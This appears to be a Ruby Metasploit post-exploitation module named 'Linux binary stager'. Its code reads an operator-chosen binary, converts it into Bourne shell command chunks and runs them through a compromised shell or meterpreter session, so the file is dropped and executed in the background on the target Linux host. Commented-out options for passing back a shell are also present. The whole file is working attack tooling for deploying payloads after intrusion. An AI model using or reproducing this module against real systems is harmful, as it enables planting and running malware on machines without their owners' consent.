require 'msf/core'

class Metasploit3 < Msf::Post

    include Msf::Post::Linux::System

    def initialize(info={})
        super( update_info( info, 
            'Name'      => 'Linux binary stager',
            'Description'   => %q{
                Upload and execute linux binaries on target system.
            },
            'License'   => MSF_LICENSE,
            'Author'    => [
                'Kevin Haubris <kevin.haubris@gmail.com>',
            ],
            'Platform'  => ['linux'],
            'SessionTypes'  => ['shell', 'meterpreter']
        ))
        register_options(
            [
                #OptAddress.new('LHOST',
                #    [true, 'IP of host to pass shell to', nil]),
                #OptInt.new('LPORT',
                #    [true, 'Port of listener for shell', 4433]),
                #OptBool.new('HANDLER',
                #    [true, 'Start exploit handler', true]),
                OptPath.new('FILE', [true, 'File to upload and run', nil])
            ], self.class)
    end

    def run

        readin = File.open(datastore['FILE'], "rb")
        exe = readin.read()
        readin.close()
        
        cmdstager = Rex::Exploitation::CmdStagerBourne.new(exe)
        
        opts = {
            :linemax => 1700,
            :background => true,
            :temp => datastore['BOURNE_PATH'],
            :file => datastore['BOURNE_FILE']
        }
        cmds = cmdstager.generate(opts)
        
        #print_status("File stuff")
        #print_status("#{datastore['BOURNE_PATH']}#{datastore['BOURNE_FILE']}")

        if cmds.nil? || cmds.length < 1
            print_error("Command stager couldn't be generated")
            raise ArgumentError
        end
        total_bytes = 0
        cmds.each { |cmd| total_bytes += cmd.length}
        begin
            sent = 0
            cmds.each { |cmd|
                ret = cmd_exec(cmd)
                if !ret 
                    aborted = true
                else
                    ret.strip!
                aborted = true if !ret.empty? && ret !~ /The process tried to write to a nonexistent pipe./
                end
                if aborted
                    print_error("Error aborted")
                    break
                end
                sent += cmd.length
                progress(total_bytes, sent)
            }
        rescue ::Interrupt
            aborted = true
        rescue => e
            print_error("Error: #{e}")
            aborted = true
        end
    end

    def progress(total, sent)
        done = (sent.to_f / total.to_f) * 100
        print_status("Command stager progress: %3.2f%% (%d/%d bytes)" % [done.to_f, sent, total])
    end

    def get_host
    case session.type
    when /meterpreter/
        host = sysinfo["Computer"]
    when /shell/
        host = cmd_exec("hostname").chomp
    end
    return host
    end
end
